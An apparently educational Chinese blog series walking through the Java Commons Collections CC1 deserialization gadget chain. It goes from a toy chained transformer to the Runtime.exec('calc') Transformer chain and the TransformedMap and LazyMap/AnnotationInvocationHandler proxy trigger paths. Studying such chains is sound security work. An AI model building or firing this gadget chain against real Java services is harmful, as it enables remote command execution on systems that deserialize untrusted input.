---
title: "Java CC · CC1"
series: java-cc-deserialization
series_order: 2
date: 2026-04-24 12:00:01 +0800
categories:
  - javaCC
---
# 实现一个链式调用器CC

## 0. 前言CC

在学习 Commons Collections 反序列化漏洞时，最核心的概念就是 **Transformer 链**。但在引入任何第三方库之前，我们先用纯 Java 代码，从零实现一个"链式调用器"。可以参考ysoserial源码。

> **环境要求**：JDK 8u65(复现要求8u72以下）

## 1. TransformerStep

首先，我们需要一个**接口**，定义"输入一个对象，输出一个对象"的契约：

```java
package com.nk7.cc.core;

/**
 * 底层抽象：输入一个对象，输出一个对象。
 * 这个接口和 commons-collections 的 Transformer 思想一致。
 */
public interface TransformerStep {
    Object transform(Object input);
}
```

这个接口只有一个方法 `transform`，它接收任意类型的输入，返回任意类型的输出。

---

## 2. 链式编排SimpleChainedTransformer

有了单个加工站，我们可以把多个加工站**串联**起来，让原料依次经过每个站点：

```java
package com.nk7.cc.core;

import java.util.Arrays;
import java.util.List;

/**
 * 底层版链式调用器：把上一步输出作为下一步输入。
 */
public class SimpleChainedTransformer implements TransformerStep {
    private final List<TransformerStep> steps;

    public SimpleChainedTransformer(TransformerStep... steps) {
        this.steps = Arrays.asList(steps);
    }

    @Override
    public Object transform(Object input) {
        Object current = input;
        for (TransformerStep step : steps) {
            current = step.transform(current);  // 关键：前一步的输出 → 后一步的输入
        }
        return current;
    }
}
```

**核心逻辑**就在这个 `for` 循环里：

用变量 `current` 保存当前数据，依次调用每个 `TransformerStep` 的 `transform` 方法，每次的返回值成为下一次的输入。

---

## 3. 第一个 Demo

现在我们来写一个测试类，用 Lambda 表达式快速创建几个转换步骤：

```java
package com.nk7.cc.core;

/**
 * 第一阶段：不依赖第三方库，先理解"链式执行"的底层机制。
 */
public class LowLevelChainDemo {
    public static void main(String[] args) {
        // 1. 定义 4 个加工步骤
        TransformerStep trim = input -> ((String) input).trim();           // 去空格
        TransformerStep upper = input -> ((String) input).toUpperCase();   // 转大写
        TransformerStep addPrefix = input -> "[CC-CHAIN] " + input;        // 加前缀
        TransformerStep addSuffix = input -> input + " <- done";           // 加后缀

        // 2. 组装成链
        SimpleChainedTransformer chain =
            new SimpleChainedTransformer(trim, upper, addPrefix, addSuffix);

        // 3. 投入原料，触发整条链
        Object result = chain.transform("   hello cc   ");
        System.out.println("LowLevelChainDemo result: " + result);
    }
}
```

**运行结果**：

```
LowLevelChainDemo result: [CC-CHAIN] HELLO CC <- done
```

数据经历了 `"   hello cc   "` → 去空格 → 转大写 → 加前缀 → 加后缀，最终变成了我们期望的格式。

---

## 4. 断点调试：观察数据流动

光看代码可能不够直观，我们通过断点调试来看看数据到底是怎么流动的。

### 4.1 在哪里打断点？

打开 `SimpleChainedTransformer.java`，在以下位置打上断点：

```java
@Override
public Object transform(Object input) {
    Object current = input;                    // ← 🔴 断点1：观察原始输入
    for (TransformerStep step : steps) {
        current = step.transform(current);     // ← 🔴 断点2：观察每一步
    }
    return current;                           
}
```

### 4.2 观察变量变化

在 IDEA 底部的 **"调试"（Debug）** 窗口中，展开 **"变量"（Variables）** 面板：


| 时机                    | `current` 的值                    | 颜色提示        |
| --------------------- | ------------------------------- | ----------- |
| 刚进入方法                 | `" hello cc "`                  | 🔴 红色（新赋值）  |
| 按 F8 执行 `trim` 后      | `"hello cc"`                    | 🔴 红色（值被改变） |
| 按 F8 执行 `upper` 后     | `"HELLO CC"`                    | 🔴 红色（值被改变） |
| 按 F8 执行 `addPrefix` 后 | `"[CC-CHAIN] HELLO CC"`         | 🔴 红色（值被改变） |
| 按 F8 执行 `addSuffix` 后 | `"[CC-CHAIN] HELLO CC <- done"` | 🔴 红色（值被改变） |


---

如果你不想每次都被断点打断，可以配置"求值并记录"：

1. **右键点击断点**（红色圆点）
2. 在弹出的设置窗口中，勾选 **"求值并记录"**
3. 在输入框中填入：
  ```
   "【步骤】当前值: " + current
  ```
4. 取消勾选 **"挂起"**

运行后，控制台会输出类似这样的日志：

```
【步骤】当前值:    hello cc   
【步骤】当前值: hello cc
【步骤】当前值: HELLO CC
【步骤】当前值: [CC-CHAIN] HELLO CC
【步骤】当前值: [CC-CHAIN] HELLO CC <- done
```

这样既能看到完整的数据流动，又不需要手动点击"继续"。

---

## 5. 总结与下一步

通过这个迷你 Demo，我们理解了三个核心概念：


| 概念       | 对应代码                                | 在真实 CC 链中的作用                |
| -------- | ----------------------------------- | --------------------------- |
| **执行单元** | `TransformerStep` 接口                | `Transformer` 接口            |
| **链式编排** | `SimpleChainedTransformer`          | `ChainedTransformer`        |
| **数据传递** | `current = step.transform(current)` | 前一个 Transformer 的输出作为后一个的输入 |


这个"输入 → 加工 → 输出 → 再加工"的模式，正是 Commons Collections 反序列化漏洞的**底层骨架**。

---

# 第 2 篇：Java 反序列化学习笔记（二）：ChainedTransformer 反射数据流

## 0. 前言

在第 1 篇中，我们用纯 Java 代码手写了 `TransformerStep` 和 `SimpleChainedTransformer`，理解了"前一步输出 → 后一步输入"的链式调用骨架。

这一篇我们将**引入真正的 Commons Collections 库**，看看 `ConstantTransformerInvokerTransformerChainedTransformer` 这三个核心组件是如何工作的。

- 理解 `ConstantTransformer` 的"忽略输入，固定返回"
- 理解 `InvokerTransformer` 的反射调用机制
- 用 `LoggingTransformer` 观察每一步的类型变化

## 1. 认识三个核心 Transformer

### 1.1 ConstantTransformer：固定返回

```java

public class ConstantTransformer implements Transformer {

    private final Object iConstant;

    public ConstantTransformer(Object constantToReturn) {

        this.iConstant = constantToReturn;

    }

    public Object transform(Object input) {

        return iConstant;  // 完全忽略输入，直接返回构造时传入的常量

    }

}

```

### 1.2 InvokerTransformer：反射调用

```java

public class InvokerTransformer implements Transformer {

    private final String iMethodName;

    private final Class[] iParamTypes;

    private final Object[] iArgs;

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {

        this.iMethodName = methodName;

        this.iParamTypes = paramTypes;

        this.iArgs = args;

    }

    public Object transform(Object input) {

        Class cls = input.getClass();

        Method method = cls.getMethod(iMethodName, iParamTypes);

        return method.invoke(input, iArgs);

    }

}

```

**一句话总结**：拿到输入对象，反射调用它的指定方法，返回执行结果。

**类比**：就像你拿到一个遥控器（input），按下一个按钮（method），电视就换台了。

### 1.3 ChainedTransformer：串联执行

```java

public class ChainedTransformer implements Transformer {

    private final Transformer[] iTransformers;

    public ChainedTransformer(Transformer[] transformers) {

        this.iTransformers = transformers;

    }

    public Object transform(Object object) {

        for (int i = 0; i < iTransformers.length; i++) {

            object = iTransformers[i].transform(object);

        }

        return object;

    }

}

```

把多个 Transformer 串成一条流水线，前一个的输出成为后一个的输入。

**运行输出**：

```

[step1-constant] input  = ignored-input (java.lang.String)

[step1-constant] output = class java.lang.Class (java.lang.Class)

                          ↑ 类型从 String 变成了 Class

[step2-getMethod] input  = class java.lang.Class (java.lang.Class)

[step2-getMethod] output = public final native java.lang.String java.lang.Class.getName() (java.lang.reflect.Method)

                          ↑ 类型从 Class 变成了 Method

[step3-invoke] input  = public final native java.lang.String java.lang.Class.getName() (java.lang.reflect.Method)

[step3-invoke] output = java.lang.String (java.lang.String)

                          ↑ 类型从 Method 变成了 String

[final] java.lang.String

```

### 3.1 数据流动轨迹

```

"ignored-input" (String)

    ↓ ConstantTransformer(Class.class)  — 忽略输入，返回 Class.class

Class.class (Class)

    ↓ InvokerTransformer("getMethod")  — 反射找 getName 方法

Method对象 (代表 getName)

    ↓ InvokerTransformer("invoke")  — 反射调用 method.invoke(String.class)

"java.lang.String" (String)  — 最终结果

```

**类型在每一步都在变化**，这就是 CC 链的核心能力——把任意对象沿链条改造成下一个节点需要的形状。

现在我们把目标改成"执行命令"。只需要把链改成：

```java

Transformer[] chain = new Transformer[]{

    new ConstantTransformer(Runtime.class),                       // 提供 Runtime.class

    new InvokerTransformer("getMethod", 

        new Class[]{String.class, Class[].class}, 

        new Object[]{"getRuntime", new Class[0]}),               // 获取 getRuntime 方法

    new InvokerTransformer("invoke", 

        new Class[]{Object.class, Object[].class}, 

        new Object[]{null, new Object[0]}),                       // 调用 invoke 获取 Runtime 实例

    new InvokerTransformer("exec", 

        new Class[]{String.class}, 

        new Object[]{"calc"})                                     // 执行命令

};

```


| 步骤       | 安全版（读类名）                           | 攻击版（执行命令）                            |
| -------- | ---------------------------------- | ------------------------------------ |
| Constant | `ConstantTransformer(Class.class)` | `ConstantTransformer(Runtime.class)` |
| 反射 1     | `getMethod("getName")`             | `getMethod("getRuntime")`            |
| 反射 2     | `invoke(String.class)`             | `invoke(null)` 获取 Runtime 实例         |
| 反射 3     | 无                                  | `exec("calc")` 执行命令                  |


---

下一步我们接触完整的transformedmap：

### 1. 触发机制

`TransformedMap` 在 `setValue()` 时触发 `checkSetValue()` → `transform()`：

java

```
// TransformedMap 核心逻辑
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

`AnnotationInvocationHandler.readObject()` 恰好会遍历 Map 并调用 `setValue()`，所以直接包装一层就能触发

### 2. 调用链

```
ObjectInputStream.readObject()
    ↓
AnnotationInvocationHandler.readObject()
    ↓ 遍历 entry → setValue(value)
TransformedMap.checkSetValue(value)
    ↓ valueTransformer.transform(value)
ChainedTransformer.transform(value)
    ↓ ConstantTransformer 忽略 value，返回 Runtime.class
    → getMethod(getRuntime)
    → invoke(null) → Runtime 实例
    → exec("calc")
    ↓
计算器弹出
```

# Java 反序列化学习笔记（三）：LazyMap 懒加载与 readObject 自动触发

## 0. 前言

第 2 篇`ChainedTransformer` 链需要手动调用 `chain.transform()` 才能触发。在真实的漏洞场景中，我们需要让目标在**反序列化时自动触发**这条链。这篇文章将引入：

- **LazyMap**：一个利用"懒加载"机制的触发器，需要时才调用
- **readObject**：JDK 在反序列化时自动调用的方法
- **完整攻击链雏形**`readObject` → `LazyMap.get()` → `ChainedTransformer.transform()` → 命令执行

## 1. 触发器：LazyMap

`LazyMap` 是 Commons Collections 提供的装饰器，它的 `get()` 方法有"懒加载"机制：

java

```
public Object get(Object key) {
    if (!map.containsKey(key)) {
        // key 不存在 → 调用工厂现场生成一个值
        Object value = factory.transform(key);
        map.put(key, value);   // 缓存，下次直接返回
        return value;
    }
    return map.get(key);       // key 存在，直接返回
}
```

**触发条件**：调用 `get(key)`，且 key **不存在**时 → `factory.transform(key)`。

`factory.transform(key)` 传入的参数是 `key`（字符串）。但我们的攻击链第一个节点是 `ConstantTransformer`，它**完全忽略输入**，所以 key 是什么都无所谓，最终都会变成 `Runtime.class`。

## 2. 入口：AnnotationInvocationHandler + 动态代理

### 2.1 为什么需要动态代理？

`AnnotationInvocationHandler.readObject()` 遍历 Map 用的是 `entrySet()`，不是 `get()`：

```
private void readObject(ObjectInputStream s) {
    Map memberValues = (Map) s.readObject();
    for (Map.Entry entry : memberValues.entrySet()) {
        // 遍历，不会触发 LazyMap.get()
    }
}
```

直接传 `LazyMap` 不会触发。需要用**动态代理拦截 `entrySet()`**，转发到 `invoke()` 方法，只要调用任意方法，就会进入到其中的invoke 方法，进而触发LazyMap的get方法，再由 `invoke()` 调用 `LazyMap.get()`。

### 2.2 三层架构

```
ObjectInputStream.readObject()
    ↓
AnnotationInvocationHandler.readObject()        ← 外层，入口
    ↓ 调用 memberValues.entrySet()
proxyMap.entrySet()                              ← 代理拦截
    ↓ 转发
AnnotationInvocationHandler.invoke()             ← 内层
    ↓ 调用 memberValues.get(key)
LazyMap.get(key)                                 ← key 不存在，触发
    ↓ factory.transform(key)
ChainedTransformer.transform()
    ↓
ConstantTransformer(Runtime.class) → ... → exec("calc")
    ↓
🖥️ 计算器弹出
```

### 2.3 假链替换

构造期用 `new ConstantTransformer(1)` 占位（假链），防止拼装过程中提前触发。所有组件拼装完成后，反射替换成真链。